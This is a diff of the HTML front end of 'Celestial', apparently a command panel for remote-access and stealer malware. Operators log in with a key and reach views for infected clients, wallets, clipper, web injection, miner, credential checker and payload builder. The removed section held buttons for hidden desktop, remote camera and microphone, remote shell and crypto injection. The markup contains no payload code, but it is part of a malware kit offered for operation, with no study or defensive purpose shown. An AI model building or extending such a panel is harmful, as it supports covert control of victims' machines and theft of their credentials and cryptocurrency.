@@ -1,88 +1,69 @@
-<!-- public/index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Celestial Control</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Celestial</title>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div id="login" class="login-container">
-    <div class="login-box">
-      <h1>Celestial</h1>
-      <input type="password" id="keyInput" placeholder="Operator Key">
-      <button id="loginBtn">Connect</button>
-      <p id="loginError"></p>
+<div id="login" class="login-container">
+  <div class="login-box">
+    <h1>Celestial</h1>
+    <input type="password" id="keyInput" placeholder="Operator Key">
+    <button id="loginBtn">Connect</button>
+    <p id="loginError"></p>
+  </div>
+</div>
+
+<div id="app" class="app hidden">
+  <aside class="sidebar">
+    <div class="logo">Celestial</div>
+    <nav id="nav">
+      <button data-view="clients" class="active">Clients</button>
+      <button data-view="recovery">Recovery</button>
+      <button data-view="wallets">Wallets</button>
+      <button data-view="proxy">Proxy</button>
+      <button data-view="clipper">Clipper</button>
+      <button data-view="webinjection">Web Injection</button>
+      <button data-view="sorter">Sorter</button>
+      <button data-view="autotasks">Auto Tasks</button>
+      <button data-view="filestore">File Store</button>
+      <button data-view="miner">Miner</button>
+      <button data-view="checker">Checker</button>
+      <button data-view="checkersessions">Checker Sessions</button>
+      <button data-view="builder">Builder</button>
+    </nav>
+    <div class="bottom">
+      <button id="logoutBtn">Logout</button>
     </div>
-  </div>
+  </aside>
 
-  <div id="app" class="app hidden">
-    <aside class="sidebar">
-      <div class="logo">Celestial</div>
-      <nav>
-        <button data-view="clients" class="active">Clients</button>
-        <button data-view="recovery">Recovery</button>
-        <button data-view="wallets">Wallets</button>
-        <button data-view="proxy">Proxy</button>
-        <button data-view="clipper">Clipper</button>
-        <button data-view="webinjection">Web Injection</button>
-        <button data-view="sorter">Sorter</button>
-        <button data-view="autotasks">Auto Tasks</button>
-        <button data-view="filestore">File Store</button>
-        <button data-view="miner">Miner</button>
-        <button data-view="checker">Checker</button>
-        <button data-view="checkersessions">Checker Sessions</button>
-        <button data-view="builder">Builder</button>
-      </nav>
-      <div class="bottom">
-        <button id="logoutBtn">Logout</button>
+  <main class="main">
+    <header class="topbar">
+      <h2 id="viewTitle">Connected Clients</h2>
+      <div class="actions">
+        <span id="statusIndicator" class="status-offline">Disconnected</span>
       </div>
-    </aside>
+    </header>
 
-    <main class="main">
-      <header class="topbar">
-        <h2 id="viewTitle">Connected Clients</h2>
-        <div class="actions">
-          <span id="statusIndicator" class="status-offline">Disconnected</span>
-        </div>
-      </header>
+    <section id="viewRoot" class="view"></section>
+  </main>
+</div>
 
-      <section id="clientsView" class="view">
-        <div class="client-list" id="clientList"></div>
-      </section>
-
-      <section id="controlView" class="view hidden">
-        <div class="control-header">
-          <button id="backToClients">← Back</button>
-          <span id="selectedClientLabel"></span>
-        </div>
-        <div class="control-panel">
-          <div class="screen-container">
-            <img id="screen" src="" alt="Remote Screen">
-          </div>
-          <div class="control-buttons">
-            <button data-action="screenshot">Screenshot</button>
-            <button data-action="hidden_desktop">Hidden Desktop</button>
-            <button data-action="visible_desktop">Visible Desktop</button>
-            <button data-action="show_overlay">Show Overlay</button>
-            <button data-action="hide_overlay">Hide Overlay</button>
-            <button data-action="shell">Shell</button>
-            <button data-action="file_manager">File Manager</button>
-            <button data-action="remote_camera">Remote Camera</button>
-            <button data-action="remote_mic">Remote Mic</button>
-            <button data-action="keyboard">Keyboard</button>
-            <button data-action="remote_shell">Remote Shell</button>
-            <button data-action="hidden_display">Hidden Display</button>
-            <button data-action="recovery">Recovery</button>
-            <button data-action="crypto_inject">Crypto Injection</button>
-          </div>
-        </div>
-      </section>
-    </main>
+<div id="modal" class="modal hidden">
+  <div class="modal-box">
+    <div class="modal-head">
+      <h3 id="modalTitle">Title</h3>
+      <button id="modalClose">✕</button>
+    </div>
+    <div id="modalBody" class="modal-body"></div>
   </div>
+</div>
 
-  <script src="/socket.io/socket.io.js"></script>
-  <script src="panel.js"></script>
+<div id="toast" class="toast hidden"></div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="panel.js"></script>
 </body>
 </html>
